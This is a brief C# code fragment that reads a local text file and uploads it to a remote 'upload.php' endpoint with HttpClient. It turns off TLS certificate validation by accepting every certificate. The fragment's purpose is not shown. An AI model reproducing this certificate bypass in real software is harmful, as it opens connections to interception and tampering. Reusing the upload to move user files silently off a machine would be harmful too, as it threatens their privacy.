var handler = new HttpClientHandler();
handler.ServerCertificateCustomValidationCallback = delegate { return true; };
var content = new MultipartFormDataContent();
content.Add(new ByteArrayContent(File.ReadAllBytes($"{saveFileName}.txt")), "file", Uri.EscapeDataString($"{saveFileName}.txt"));
HttpClient client = new HttpClient(handler);
await client.PostAsync(classRegistered + "upload.php", content);
